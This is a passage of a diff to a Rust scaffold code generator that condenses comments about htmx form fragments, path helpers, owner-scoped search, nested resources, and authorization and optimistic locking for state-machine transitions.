-            // the form through the raw-markup constrained control (carrying the
-            // #1388 HTML5 attributes `minlength`/`maxlength`/`type="email"`), so
-            // its inline-validation fragment must return the SAME markup —
-            // otherwise the htmx `outerHTML` swap on the first `change` would
-            // shed those client-side guards. The swapped-in field re-wires its
-            // own htmx trigger from the identical `validate_url`.
+            // A constrained `String`/`Text` field renders as a raw-markup control with HTML5
+            // attributes (`minlength`, `maxlength`, `type="email"`), so its fragment must return
+            // the same markup, or the `outerHTML` swap would drop those guards (#1750).
             let constrained = field.and_then(|f| {
                 html5_constraint_spec(f).and_then(|(input_type, _attrs)| {
-                    // Numerics don't take the htmx path (no wrapper to swap), so
-                    // only the text-family constrained controls need a fragment.
+                    // Numerics have no htmx wrapper to swap, so only text controls qualify.
                     matches!(f.kind, FieldKind::String | FieldKind::Text).then_some((f, input_type))
                 })
             });
@@ -7496,16 +6245,12 @@ pub async fn index(
             vh.push_str("    };\n");
             vh.push_str("    let changeset = form.into_changeset();\n");
             if let Some((f, input_type)) = constrained {
-                // The validate endpoint URL is emitted as a typed path-helper
-                // call expression (issue #1133), spliced into `.hx("post", …)`.
                 let url = format!("paths::validate_{field_name}()");
                 let markup = render_live_constrained_field(f, "changeset", input_type, Some(&url));
                 let _ = writeln!(vh, "    autumn_web::html! {{\n        {markup}\n    }}");
             } else {
-                // Match `render_changeset_form_inputs`'s helper choice: a
-                // non-nullable field keeps `required`/`aria-required` through the
-                // htmx round-trip too, otherwise the attribute would vanish from
-                // the DOM the moment the field's wrapper gets swapped in.
+                // Match `render_changeset_form_inputs`: a non-nullable field must keep
+                // `required`/`aria-required` after the wrapper is swapped in.
                 let helper = if field.is_some_and(|f| f.nullable) {
                     "text_input_htmx"
                 } else {
@@ -7523,15 +6268,9 @@ pub async fn index(
         String::new()
     };
 
-    // Issue #1255: one `POST /{plural}/preview/{field}` fragment endpoint per
-    // `richtext` column, driving that column's htmx live preview.
-    //
-    // The handler decodes the same submitted form the create/update handlers
-    // do (so the endpoint needs no bespoke request type) and returns the
-    // field's Markdown rendered through `markdown::render_user_content` — the
-    // sanitizing helper, identical to the show view. That equality is the whole
-    // point: what the author sees in the preview is byte-for-byte what a reader
-    // will see, including anything the allowlist strips.
+    // One `POST /{plural}/preview/{field}` endpoint per `richtext` column (#1255). It renders
+    // through the sanitizing `markdown::render_user_content`, as the show view does, so the
+    // preview matches what a reader will see.
     let preview_handlers = {
         let mut ph = String::new();
         for f in rich_text_fields(fields) {
@@ -7553,16 +6292,9 @@ pub async fn index(
                 ph,
                 "pub async fn preview_{field_name}(body: autumn_web::reexports::axum::body::Bytes) -> autumn_web::Markup {{"
             );
-            // Read ONLY the previewed field, leniently — never `decode_form`.
-            // The editor `hx-include`s the whole form, so on a fresh `new` page
-            // every other column arrives blank; deserializing the form struct
-            // would fail on the first strictly-typed empty field (`count=` into
-            // an `i64`) and blank the preview until the author had filled in
-            // every unrelated column (PR #2157 review). A preview performs no
-            // validation, so it has no reason to need the rest of the form —
-            // unlike the inline-validation fragments above, which decode the
-            // whole form precisely because checking `#[validate]` rules is
-            // their job.
+            // Read only the previewed field, never `decode_form`: on a fresh `new` page the
+            // other columns arrive blank, and decoding the form struct would fail on the first
+            // empty typed field (`count=` into an `i64`), blanking the preview.
             let _ = writeln!(
                 ph,
                 "    let source = autumn_web::form::field_from_urlencoded(&body, \"{field_name}\")\n        .unwrap_or_default();"
@@ -7573,14 +6305,10 @@ pub async fn index(
         ph
     };
 
-    // Issue #1133: emit an `autumn_web::paths![…]` invocation so the routes
-    // module gains a `pub mod paths` re-exporting each handler's typed
-    // `__autumn_path_*` companion under a clean short name. Every view href,
-    // form action, and redirect above calls into this module (e.g.
-    // `paths::show(id)`), so the resource's URLs have a single source of truth:
-    // the route-macro path strings. `new_form`/`edit_form`/`destroy` carry
-    // `name = "new"|"edit"|"delete"` overrides so their helpers read
-    // `paths::new()`/`paths::edit(id)`/`paths::delete(id)`.
+    // `autumn_web::paths![…]` emits `pub mod paths`, re-exporting each handler's typed path
+    // helper (#1133). Every href, form action and redirect calls into it, so the route-macro
+    // paths are the single source of truth. `new_form`/`edit_form`/`destroy` carry
+    // `name = "new"|"edit"|"delete"` overrides, hence these names.
     let paths_macro = {
         let mut names: Vec<String> = vec![
             "index".to_owned(),
@@ -7591,41 +6319,24 @@ pub async fn index(
             "update".to_owned(),
             "delete".to_owned(),
         ];
-        // Issue #1312: `paths::bulk_delete()` backs the index list's bulk form
-        // action. Gated with the handler, so the `--live`/`--sharded` paths!
-        // block stays byte-identical.
+        // Each optional helper is gated with its handler.
         if bulk_delete_enabled {
             names.push("bulk_delete".to_owned());
         }
-        // Issue #1315: `paths::export_csv()` backs the index's "Export CSV"
-        // link. Gated with the handler, so a gated-off variant's `paths!` block
-        // stays byte-identical.
         if export_enabled {
             names.push("export_csv".to_owned());
         }
-        // Issue #1393: `paths::import_form()` backs the index's "Import CSV" link
-        // and `paths::import()` the upload form's action. Two helpers for one
-        // URL — the GET and the POST live at the same path, exactly as `index`
-        // and `create` do — so a reader can tell which verb a call site means.
-        // Gated with the handlers, so a scaffold without `--import` keeps its
-        // `paths!` block byte-identical.
+        // One URL, two helpers: GET `import_form` and POST `import`, like `index` and `create`,
+        // so a call site shows which verb it means (#1393).
         if import_enabled {
             names.push("import_form".to_owned());
             names.push("import".to_owned());
         }
-        // Issue #1332: `paths::trash()` backs the index's "Trash" link and both
-        // recovery redirects; `paths::restore(id)`/`paths::purge(id)` back the
-        // per-row controls. Gated with the handlers, so a scaffold without
-        // `--soft-delete` keeps its `paths!` block byte-identical.
         if trash_enabled {
             names.push("trash".to_owned());
             names.push("restore".to_owned());
             names.push("purge".to_owned());
         }
-        // Issue #1358: `paths::move_up(id)`/`paths::move_down(id)` back the
-        // index's per-row reorder buttons. Gated with the handlers, so a
-        // scaffold without a `position` field keeps its `paths!` block
-        // byte-identical.
         if reorder_enabled {
             names.push("move_up".to_owned());
             names.push("move_down".to_owned());
@@ -7633,29 +6344,18 @@ pub async fn index(
         if live {
             names.push("events".to_owned());
         }
-        // Issue #1323: the nested list/create endpoints the children section
-        // links and posts to (`paths::nested_index(id)` /
-        // `paths::nested_create(id)`). Absent without `--belongs-to`, so a flat
-        // scaffold's `paths!` block stays byte-identical.
         if nesting.is_some() {
             names.push("nested_index".to_owned());
             names.push("nested_create".to_owned());
         }
-        // One inline-validation endpoint per validated field (live-validation
-        // only), each linked from the form's `.hx("post", paths::validate_{f}())`.
         if live_validation {
             for (field_name, _) in &htmx_validated {
                 names.push(format!("validate_{field_name}"));
             }
         }
-        // Issue #1255: one preview endpoint per `richtext` column, linked from
-        // the form's `rich_text_area_htmx(&…, paths::preview_{field}())`.
         for f in rich_text_fields(fields) {
             names.push(format!("preview_{}", f.name));
         }
-        // Issue #1326: one transition endpoint per state-machine field, linked
-        // from the show page's `transition_controls` form actions
-        // (`paths::transition_{field}(id)`).
         for f in &sm_fields {
             let field = &f.name;
             names.push(format!("transition_{field}"));
@@ -7668,20 +6368,13 @@ pub async fn index(
         out
     };
 
-    // #1319: the FTS results handler backing the index `active_search` box. For htmx
-    // requests it returns just the results fragment, swapped into
-    // `#{plural}-search-results`; for a plain navigation — a bookmarked search URL, or a
-    // shared pager link — it returns the full page, so search degrades gracefully without
-    // JavaScript. An empty `q` falls back to the standard `page(&page_req)` listing (AC3).
-    // It reuses the same `columns` and reference-label loads the index builds, so search
-    // rows render identically, and the pager preserves the request's raw query string,
-    // stripping `page` and `size`, via `PagerOptions::query`, so `q` survives pagination
-    // with no hand-rolled percent-encoding.
+    // The full-text search handler behind the index search box (#1319). An htmx request gets
+    // the results fragment; a plain navigation (bookmark, shared pager link) gets the full
+    // page, so search works without JavaScript. An empty `q` falls back to `page(&page_req)`.
+    // The pager keeps the raw query string via `PagerOptions::query`, so `q` survives paging.
     //
-    // #1312: the fragment htmx swaps into `#{plural}-search-results` is the whole bulk
-    // form, not just the table. Otherwise the first search would replace the form's
-    // innards with checkboxes that have no `<form>`, and no submit button, around them,
-    // silently breaking bulk delete after a search.
+    // The swapped fragment is the whole bulk form, not just the table: otherwise a search
+    // would leave the checkboxes with no `<form>` or submit button around them (#1312).
     let search_results_table = format!(
         r#"(autumn_web::widgets::data_table(&page_data.content, &columns, &autumn_web::widgets::DataTableConfig::new({search_empty}).base_path("/{plural}/search")))"#
     );
@@ -7696,9 +6389,8 @@ pub async fn index(
     } else {
         format!("{search_results_table}\n        {search_results_pager}")
     };
-    // Issue #1323: the `--belongs-to` nested surface — the shared
-    // `children_section` the parent's `show` view renders, the standalone page
-    // wrapper, and the two nested handlers. Empty for a flat scaffold.
+    // The `--belongs-to` nested surface (#1323): the `children_section` the parent's `show`
+    // renders, its standalone page, and the two nested handlers.
     let nested_section = nesting.map_or_else(String::new, |n| {
         render_nested_section(
             backend,
@@ -7723,14 +6415,9 @@ pub async fn index(
     });
 
     let search_handler = if search_enabled && owner_scoped_standard {
-        // Issue #1841: owner-scoped FTS handler for the standard Db path. The
-        // SECURITY INVARIANT is that this branch calls ONLY the owner-filtered
-        // repository methods — `repo.search_page_scoped(owner_id, ..)` for a
-        // query, and `repo.list_scoped(owner_id, ..)` for the empty-query
-        // fallback — NEVER the unscoped `repo.search_page`/`repo.page`, so the
-        // `/search` endpoint can never surface another user's rows (the exact
-        // leak the pre-#1841 rejection guarded against). `owner_id` comes from
-        // the same `PolicyContext` the mutating handlers authorize against.
+        // Owner-scoped search for the standard Db path (#1841). Security invariant: this branch
+        // calls only `search_page_scoped`/`list_scoped` with `owner_id`, never the unscoped
+        // `search_page`/`page`, so `/search` cannot surface another user's rows.
         let field_list = searchable.join(", ");
         format!(
             r#"
@@ -7903,17 +6590,13 @@ use crate::schema::{schema_import};",
             ""
         },
     ) + &{
-        // Issue #1130: standard scaffolds render through the app's shared
-        // `crate::layout`, so no private layout is emitted here. Live and
-        // live-validation views keep a local `layout` because they need extra
-        // `<head>` scripts (SSE/idiomorph) and a morph-enabled `<body>` the
-        // shared 4-arg shell can't express.
+        // Standard scaffolds use the app's shared `crate::layout` (#1130). Live views keep a
+        // local `layout`: they need extra `<head>` scripts and a morph-enabled `<body>` the
+        // shared shell cannot express.
         let private_layout = if shared_layout {
             String::new()
         } else {
-            // Load htmx + SSE extension whenever live features are active.
-            // `--live-validation` alone (without `--live`) still requires htmx
-            // for the `hx-post` / `hx-trigger` / `hx-swap` attributes to fire.
+            // `--live-validation` alone still needs htmx for its `hx-*` attributes.
             let live_head_scripts = if live {
                 "\n                script src=(autumn_web::htmx::HTMX_JS_PATH) {};\n\
                  \x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20script src=(autumn_web::htmx::HTMX_SSE_JS_PATH) {};\n\
@@ -7956,16 +6639,13 @@ fn layout(title: &str, flash: Markup, content: Markup) -> Markup {{
 "#
             )
         };
-        // Issue #1326: the `show` detail section. Without a state machine this is
-        // exactly the pre-#1326 inline `show` handler (byte-identical output).
-        // With one or more `:states(…)` fields it becomes a shared `show_view`
-        // helper (rendered by `show` AND each transition handler's 422 re-render),
-        // a `show` handler threading CSRF for the transition forms, and one
-        // `POST /{plural}/{{id}}/transitions/{field}` handler per state-machine
-        // field.
-        // Issue #1323 AC5: the child's detail page links back to the parent it
-        // belongs to, closing the loop the parent's children list opens. Empty
-        // without `--belongs-to`.
+        // The `show` section (#1326). Without a state machine it is the plain inline `show`
+        // handler. With `:states(…)` fields it becomes a shared `show_view` helper (rendered
+        // by `show` and each transition handler's 422 re-render), a `show` handler threading
+        // CSRF for the transition forms, and one `POST /{plural}/{{id}}/transitions/{field}`
+        // handler per state-machine field.
+        //
+        // With `--belongs-to`, the detail page links back to its parent (#1323).
         let show_parent_backlink = nesting.map_or_else(String::new, |n| {
             format!(
                 "\n        \" \"\n        (autumn_web::a11y::Link::new(crate::routes::{}::paths::show(row.{}), \"Back to {}\"))",
@@ -7973,10 +6653,8 @@ fn layout(title: &str, flash: Markup, content: Markup) -> Markup {{
             )
         });
         let show_section = if has_state_machine {
-            // `show_view` only touches the DB when it must resolve reference
-            // display labels (issue #1146); otherwise the connection is unused, so
-            // name it `_db` (and drop `mut`) to keep the generated crate
-            // warning-free.
+            // `show_view` only uses the DB to resolve reference display labels (#1146);
+            // otherwise name it `_db` (no `mut`) to keep the generated crate warning-free.
             let show_view_db_param = if show_label_loads.trim().is_empty() {
                 format!("_db: {db_ty}")
             } else {
@@ -7984,10 +6662,9 @@ fn layout(title: &str, flash: Markup, content: Markup) -> Markup {{
             };
             let show_transition_label_binds =
                 render_show_transition_label_binds(&sm_fields, snake_name, labels);
-            // #2227: the group label and each button's text come from
-            // autumn-web. Under `--i18n` the `_with_labels` variant takes them
-            // from the bundle instead. The bindings sit above the `html!`
-            // block (see `render_show_transition_label_binds`), because
+            // The group label and button text come from autumn-web (#2227). Under `--i18n` the
+            // `_with_labels` variant takes them from the bundle; the bindings sit above the
+            // `html!` block (see `render_show_transition_label_binds`) because
             // `TransitionLabels` borrows them.
             let mut show_transition_controls = String::new();
             for f in &sm_fields {
@@ -8044,21 +6721,14 @@ pub async fn show(
 {show_authz_call}    show_view({show_view_locale_arg}db, &row, {flash_arg}, csrf.as_ref(), csrf_field.as_ref(){show_view_state_arg_call}).await
 }}"#
             );
-            // #1326 security fix (IDOR): a transition mutates an existing row,
-            // so with record-policy wiring on — the default for non-`--api`
-            // scaffolds — the handler must record-authorize the actor against
-            // the loaded row before writing, using the same `"update"` action
-            // `update` uses. Without this, any authenticated user who knows
-            // another row's id could POST a transition and change its state,
-            // bypassing the record policy. It mirrors the `update`/`destroy`
-            // authorize preamble: the `State(state)` plus `session: Session`
-            // pair — a transition handler never carries a multipart `state`, so
-            // there is no attachment-reuse concern — and `&state` as the
-            // `AppState` receiver. With policy wiring off it emits nothing.
-            // #1236: with attachments the shared `show_view` needs the app state
-            // to sign the stored file's URL. The authorize wiring already injects
-            // one; under `--no-policy` the transition handler adds its own, and
-            // either binding shape coerces to `&AppState`.
+            // A transition mutates an existing row, so with policy wiring on it must
+            // record-authorize the actor against the loaded row with the `"update"` action
+            // before writing. Otherwise anyone who knows a row's id could change its state
+            // (IDOR, #1326). Same preamble as `update`/`destroy`.
+            //
+            // With attachments, `show_view` needs the app state to sign file URLs (#1236). The
+            // authorize wiring already injects one; under `--no-policy` the handler adds its
+            // own. Either binding shape coerces to `&AppState`.
             let transition_authz_params = if authorize {
                 "    autumn_web::extract::State(state): autumn_web::extract::State<autumn_web::AppState>,\n    session: autumn_web::session::Session,\n"
             } else if has_attachments {
@@ -8073,25 +6743,15 @@ pub async fn show(
             } else {
                 String::new()
             };
-            // #1318: a state transition is a read-modify-write — it loads the row,
-            // asks `transition_{field}_to` whether the edge is legal from the state
-            // it just read, then writes. With a lock column in play that sequence
-            // becomes a compare-and-swap against the version it read, for two
-            // reasons:
+            // A transition is a read-modify-write, so with a lock column it becomes a
+            // compare-and-swap against the version it read (#1318):
+            //   * the guard stops two concurrent transitions out of the same state from both
+            //     committing (each passes the legality check against its own stale row);
+            //   * the bump makes the transition visible to edit forms opened before it, so
+            //     their save gets the 409 conflict instead of silently overwriting.
             //
-            //   * the guard stops two concurrent transitions out of the same source
-            //     state from both committing. Both would pass the legality check
-            //     against the stale row they each loaded, and an `id`-only `WHERE`
-            //     would let the second silently overwrite the first;
-            //   * the bump makes the transition visible to everyone else guarding on
-            //     the version. Without it, an author holding an edit form opened
-            //     before the transition saves successfully and is never told the
-            //     record moved on — exactly the "changed by someone else" case the
-            //     409 banner promises.
-            //
-            // Every fragment is empty without a lock column, including the tuple
-            // parentheses: the emitted `.set(...)` must stay the single-expression
-            // pre-#1318 form byte for byte.
+            // Without a lock column every fragment is empty, tuple parentheses included, so
+            // `.set(...)` stays a single expression.
             let (transition_set_open, transition_lock_bump, transition_set_close) =
                 if lock_version.is_some() {
                     (
@@ -8110,23 +6770,14 @@ pub async fn show(
             let transition_lock_filter = lock_version.map_or_else(String::new, |_| {
                 format!(".filter({plural}::lock_version.eq(row.lock_version))")
             });
-            // Zero rows is ambiguous: the version moved between the load and the
-            // write, or the row was deleted outright. The block re-reads to tell
-            // them apart — 409 with the detail page re-rendered for a record
-            // someone else changed, 404 for one that is gone — rather than
-            // redirecting with a success flash for a transition that never
-            // happened, or offering a conflict page whose suggested reload cannot
-            // succeed. It renders the re-read row, not this request's snapshot: the
-            // reader is deciding again, and the legal edges may no longer be the
-            // ones they were shown.
+            // Zero rows updated means the version moved or the row was deleted. The block
+            // re-reads to tell them apart: 409 re-rendering the current row (its legal edges
+            // may have changed), or 404 if it is gone.
             //
-            // The re-read row must be re-authorized before it is rendered. The
-            // policy check earlier in this handler ran against `row`, the snapshot
-            // this request loaded, and a record policy can depend on mutable row
-            // data — the generated owner policy does — so the concurrent write that
-            // moved the version may also have moved the row out of this actor's
-            // reach. Rendering `current` unchecked would hand them its properties
-            // and transition controls. Empty without a policy.
+            // The re-read row must be re-authorized before rendering: the earlier check ran
+            // against this request's snapshot, and a record policy can depend on mutable row
+            // data (the generated owner policy does), so the concurrent write may have moved the
+            // row out of this actor's reach. Empty without a policy.
             let transition_conflict_reauthz = if authorize {
                 format!(
                     "                autumn_web::authorization::authorize::<{pascal_name}>(&state, &session, \"update\", &current).await?;\n"
@@ -8174,23 +6825,15 @@ pub async fn show(
             let mut transition_handlers = String::new();
             for f in &sm_fields {
                 let field = &f.name;
-                // Per FIELD as well as per resource: "Post status updated" and
-                // "Post visibility updated" are different sentences, and a
-                // model can carry more than one state-machine column.
+                // Keyed per field: a model can have several state-machine columns, and
+                // "Post status updated" and "Post visibility updated" are different sentences.
                 let flash_transitioned = labels.lit(
                     &format!("{snake_name}.flash.{field}_updated"),
                     &format!("{pascal_name} {field} updated"),
                 );
-                // Issue #1349: the REJECTION is user-facing too, and it is the
-                // one an ordinary reader is most likely to hit. `err` here is
-                // the model method's error, whose Display is built in
-                // autumn-macros as a hardcoded English "Cannot transition …" —
-                // a string this generator cannot route a `t!` through. So under
-                // `--i18n` the flash carries a translated message instead of
-                // the error's own text. One shared key: the sentence does not
-                // vary by field, and the specifics it drops (which edge was
-                // refused) are developer detail rather than something an author
-                // clicking a button can act on.
+                // `err`'s Display is hardcoded English from autumn-macros, so under `--i18n`
+                // the rejection flash uses a translated message instead (#1349). One shared
+                // key: which edge was refused is developer detail, not something a user can act on.
                 let flash_rejected = labels.expr(
                     "common.transition.rejected",
                     "That change is not allowed from the current state.",
@@ -8433,13 +7076,12 @@ pub async fn events(
               coherent block of generated code"
 )]
 fn render_nested_section(
-    // Passed through to the child list's column vec (issue #1924).
     backend: DatabaseBackend,
     pascal_name: &str,
     snake_name: &str,
     plural: &str,
     nesting: &super::nested::Nesting,
-    // The FORM field list (the same one the flat index/forms render from).
+    // The form field list, as the flat index and forms use.
     fields: &[Field],
     reference_fields: &[&Field],
     reference_displays: &BTreeMap<String, ReferenceDisplay>,
@@ -8449,9 +7091,8 @@ fn render_nested_section(
     has_lock_version: bool,
     has_unique: bool,
     authorize: bool,
-    // The owner column the flat index scopes its list to (issue #1125/#1830), or
-    // `None` when this scaffold has none. `Some` makes the nested list carry the
-    // SAME owner scoping, so nesting can never widen what a resource discloses.
+    // The owner column the flat index scopes to (#1125/#1830). The nested list applies the same
+    // scoping, so nesting never widens what a resource discloses.
     owner_scoped: Option<&str>,
     layout_fn: &str,
     cp_nested: &str,
@@ -8463,22 +7104,14 @@ fn render_nested_section(
     let parent_snake = nesting.parent_snake.as_str();
     let route = nesting.route_path(plural);
 
-    // The parent foreign key is dropped from the child list's columns: in a
-    // list already scoped to one parent it is the same value on every row, so a
-    // column for it is pure noise (and, with #1146 display labels, an extra
-    // query per page for a value the page title already states).
+    // Drop the parent FK column: in a list scoped to one parent it is the same on every row (and
+    // with display labels, #1146, would cost an extra query per page).
     let list_fields: Vec<Field> = fields.iter().filter(|f| f.name != fk).cloned().collect();
 
-    // Display-label maps for the remaining `references` columns, mirroring what
-    // the flat index loads (#835: scoped to `page_data.content`'s own FK
-    // values via `WHERE id = ANY(...)`, not a full-table load — the nested
-    // list is paginated exactly like the flat index, so the same over-fetch
-    // applied here too). Written here rather than reusing
-    // `render_index_reference_label_loads` because this helper holds the
-    // connection as `&mut Db` (so a parent can render several children off one
-    // connection), which needs a double-deref reborrow (`&mut **db`) at each
-    // call site — matching `total`/`items` above, not the single-deref owned
-    // `db: Db` the flat index handlers take.
+    // Display-label maps for the remaining `references` columns, loaded only for this page's FK
+    // values (#835). Not `render_index_reference_label_loads`: this helper holds the connection
+    // as `&mut Db` (so a parent can render several children off one connection), which needs a
+    // `&mut **db` reborrow.
     let mut label_loads = String::new();
     for f in reference_fields {
         if f.name == fk {
@@ -8524,17 +7157,13 @@ fn render_nested_section(
         true,
         route_key_field,
         false,
-        // Issue #1349: `--belongs-to` is refused alongside `--i18n` upstream —
-        // this section splices markup into the PARENT's already-generated `show`
-        // handler, whose signature carries no `Locale` extractor — so the nested
-        // child list always renders the plain English labels.
+        // `--belongs-to` is refused with `--i18n` (#1349): this section is spliced into the
+        // parent's `show` handler, which has no `Locale` extractor.
         &scaffold_i18n::ViewLabels::disabled(),
     );
 
-    // Select options for the inline form's OTHER `references` columns. The
-    // parent FK gets an empty slice: `exclude_parent_fk` drops its control, so
-    // the options would never be rendered — loading them would be a wasted
-    // query on every parent show page.
+    // Select options for the inline form's other `references` columns. The parent FK gets an
+    // empty slice: `exclude_parent_fk` drops its control, so loading them would waste a query.
     let mut option_loads = String::new();
     let mut option_args = String::new();
     for f in reference_fields {
@@ -8549,29 +7178,23 @@ fn render_nested_section(
         );
         let _ = write!(option_args, ", &{name}_options");
     }
-    // The nested form is a CREATE form, so it mirrors the flat create call's
-    // trailing flags: keep state-machine columns (the initial state), no lock
-    // version to guard against — plus `true` for the nested-only FK exclusion.
+    // A create form: keep state-machine columns (the initial state), no lock version, plus
+    // `true` for the nested-only FK exclusion.
     let form_exclude_state = if has_state_machine { ", false" } else { "" };
     let form_lock = if has_lock_version { ", None" } else { "" };
-    // Soft-deleted children must not resurface in the parent's list; the flat
-    // index gets this for free through the repository's soft-delete support,
-    // but this parent-scoped query is hand-written.
+    // This query is hand-written, so it filters soft-deleted rows itself; the flat index gets
+    // that from the repository.
     let deleted_filter = if soft_delete {
         format!("\n        .filter({plural}::deleted_at.is_null())")
     } else {
         String::new()
     };
 
-    // Security (#1125/#1830 posture parity): when the flat `GET /{plural}` index is
-    // owner-scoped, the nested list must be too. Otherwise `--belongs-to` would quietly
-    // open a second, unscoped door onto the same rows — a child list scoped only by parent
-    // would disclose every user's children of that parent, including through the parent's
-    // public show page. The scoping lives in `children_section_with`, so both entry points,
-    // the nested page and the parent's show view, inherit it. The `AppState`/`Session` pair
-    // is always in the helper's signature, since the parent-side injection emits one fixed
-    // call shape, but is `_`-prefixed, and so warning-free, for a scaffold with no owner
-    // column.
+    // When the flat index is owner-scoped, the nested list must be too (#1125/#1830), or it
+    // would disclose every user's children of a parent, including via the parent's public show
+    // page. The scoping lives in `children_section_with`, so both the nested page and the parent's
+    // show view inherit it. The `AppState`/`Session` pair is always in the signature (the parent
+    // side emits one fixed call shape), `_`-prefixed when there is no owner column.
     let (state_param, session_param, owner_prelude, owner_filter) = owner_scoped.map_or_else(
         || (
             "_state: &autumn_web::AppState",
@@ -8587,8 +7210,7 @@ fn render_nested_section(
             format!("\n        .filter({plural}::{owner_col}.eq(owner_id))"),
         ),
     );
-    // The nested page is `#[secured]` exactly when the flat index is — i.e.
-    // whenever the list is owner-scoped and therefore only meaningful for a
+    // `#[secured]` exactly when the flat index is: an owner-scoped list only means something to a
     // signed-in user.
     let nested_index_secured = if owner_scoped.is_some() {
         "#[secured]\n"
@@ -8596,10 +7218,7 @@ fn render_nested_section(
         ""
     };
 
-    // Authorization mirrors the flat `create` exactly: a nested create is still
-    // a create, so it runs the same context-only `authorize_create` check
-    // against the same policy (issue #1125). Without policy wiring both
-    // fragments are empty and the handler is just path/flash/csrf/db/body.
+    // A nested create runs the same `authorize_create` check as the flat `create` (#1125).
     let authz_call = if authorize {
         format!(
             "    autumn_web::authorization::authorize_create::<{pascal_name}>(&state, &session).await?;\n"
@@ -8607,19 +7226,15 @@ fn render_nested_section(
     } else {
         String::new()
     };
-    // The argument names `children_section` forwards to `children_section_with`
-    // — `_`-prefixed in lockstep with `{state_param}`/`{session_param}` so an
-    // unscoped scaffold stays warning-free.
+    // `_`-prefixed in lockstep with `state_param`/`session_param`.
     let (state_arg, session_arg) = if owner_scoped.is_some() {
         ("state", "session")
     } else {
         ("_state", "_session")
     };
 
-    // A duplicate value on a `unique` column is a constraint violation, not a
-    // validation failure, so — exactly like the flat create (issue #1032) — it
-    // is classified into an inline field error and re-rendered at 422 rather
-    // than surfacing as a 500.
+    // A duplicate on a `unique` column becomes an inline field error at 422, not a 500, as in
+    // the flat create (#1032).
     let insert_record = insert_record_expr(fields);
     let insert_block = if has_unique {
         format!(
@@ -8885,9 +7500,8 @@ fn wrap_form_bodies(
     edit_form_layout: String,
     option_loads: &str,
     edit_attachment_url_binds: &str,
-    // Issue #1349: bindings only the NEW form needs — the localized resource
-    // display name its "New {Model}" title and heading interpolate. Empty
-    // without `--i18n`, so the wrapping below stays byte-identical.
+    // Bindings only the new form needs: the localized display name its "New {Model}" title and
+    // heading use (#1349). Empty without `--i18n`.
     new_form_binds: &str,
 ) -> (String, String) {
     let new_body = if option_loads.is_empty() && new_form_binds.is_empty() {
@@ -8976,8 +7590,6 @@ fn render_rich_text_label_binds(fields: &[Field], labels: &scaffold_i18n::ViewLa
     );
     let mut entries = String::new();
     for (key, english, syntax) in RICH_TEXT_CHROME_CONTROLS {
-        // The key's last segment names the binding, so the generated source
-        // reads as the toolbar does.
         let ident = key.rsplit('.').next().unwrap_or(key);
         let _ = writeln!(out, "    let l_rt_{ident} = {};", labels.lit(key, english));
         let _ = write!(entries, "\n        (l_rt_{ident}.as_str(), \"{syntax}\"),");
@@ -9055,17 +7667,14 @@ fn render_form_for_helper(
     pascal_name: &str,
     snake_name: &str,
     fields: &[Field],
-    // Issue #1349: relabels every control through `{snake}.field.{name}` when
-    // `--i18n` is on, and is an identity function over the derived English
-    // labels when it is off.
+    // Relabels every control through `{snake}.field.{name}` under `--i18n` (#1349); identity
+    // otherwise.
     labels: &scaffold_i18n::ViewLabels,
     missing_reference_targets: &BTreeSet<String>,
-    // The Rust type of the model's `lock_version` counter (issue #1318), or
-    // `None` when the model declares no optimistic-locking column.
+    // Rust type of the `lock_version` column (#1318); `None` without optimistic locking.
     lock_version_ty: Option<&str>,
-    // The parent foreign-key column under `--belongs-to` (issue #1323), or
-    // `None` for a flat scaffold. `Some` adds the `exclude_parent_fk` flag the
-    // nested inline create form passes to drop that control.
+    // The parent FK under `--belongs-to` (#1323). `Some` adds the `exclude_parent_fk` flag the
+    // nested create form passes to drop that control.
     parent_fk: Option<&str>,
 ) -> String {
     use std::fmt::Write as _;
@@ -9077,25 +7686,17 @@ fn render_form_for_helper(
         let name = &f.name;
         match f.kind {
             FieldKind::Attachment => {
-                // Issue #1236: promote the attachment to `FieldControl::File`.
-                // The derive sees an opaque `Blob` column and falls back to a
-                // text control, so override it. `FieldControl::File` (a) flips
-                // the whole `<form>` to `enctype="multipart/form-data"` so the
-                // browser uploads the file with zero JavaScript, (b) renders a
-                // plain `<input type="file">` (no hidden key input — uploads no
-                // longer round-trip a presign key), and (c) renders the same
-                // inline-error/ARIA skeleton as the other controls, so changeset
-                // errors on the attachment still surface.
+                // The derive sees an opaque `Blob` and falls back to a text control (#1236).
+                // `FieldControl::File` flips the form to `multipart/form-data`, so uploads work
+                // without JavaScript, and keeps the inline-error/ARIA skeleton.
                 let _ = write!(
                     builder_calls,
                     "\n        .override_field(\"{name}\", autumn_web::form::FieldControl::File)"
                 );
             }
             FieldKind::Json => {
-                // Issue #1341: the derive sees an opaque `serde_json::Value`
-                // column and falls back to a single-line text control (same
-                // fallback `Attachment`'s raw `Blob` hits above) — promote it
-                // to a `<textarea>` so a real JSON object/array fits.
+                // The derive falls back to a single-line text control for `serde_json::Value`;
+                // a textarea fits a real JSON object (#1341).
                 let _ = write!(
                     builder_calls,
                     "\n        .override_field(\"{name}\", autumn_web::form::FieldControl::Textarea)"
@@ -9107,9 +7708,7 @@ fn render_form_for_helper(
                 } else {
                     ("common.select.prompt", "— Select —")
                 };
-                // `.into()` on a `&str` literal and on the `String` a `t!` call
-                // returns both land on `String`, so the emitted `vec!` element
-                // is well-typed either way.
+                // `.into()` yields `String` from both a `&str` literal and a `t!` result.
                 let mut options = format!(
                     "(\"\".into(), {}.into())",
                     labels.lit(placeholder_key, placeholder)
@@ -9126,37 +7725,23 @@ fn render_form_for_helper(
                 );
             }
             FieldKind::RichText => {
-                // #1255: the derive sees a plain `String` column and emits a
-                // single-line text input. A rich-text column instead renders
-                // `form::rich_text_area_htmx` — a Markdown editor with a syntax
-                // hint and an htmx live-preview pane wired to the generated `POST
-                // /{plural}/preview/{field}` endpoint. That is a whole labeled
-                // control, not a `FieldControl` variant, so it takes the same
-                // `.exclude()` plus `.append()` escape hatch the constrained-field
-                // arm below uses. The token-field-aware variant is used so the
-                // preview POST's `hx-params` filter names the app's actual
-                // configured `[security.submit_token].field_name` (#1843), not just
-                // the default; the helper already has the `SubmitFormField`
-                // extractor in scope for `submit_token_input`. `rich_text_area_*`
-                // takes `&str`, unlike the `a11y` builders' `impl Into<String>`, so
-                // this label site borrows.
+                // A rich-text column renders a Markdown editor with an htmx preview wired to
+                // `POST /{plural}/preview/{field}` (#1255). It is a whole labeled control, not a
+                // `FieldControl`, so it uses `.exclude()` plus `.append()`. The token-field
+                // variant makes the preview's `hx-params` name the configured submit-token field
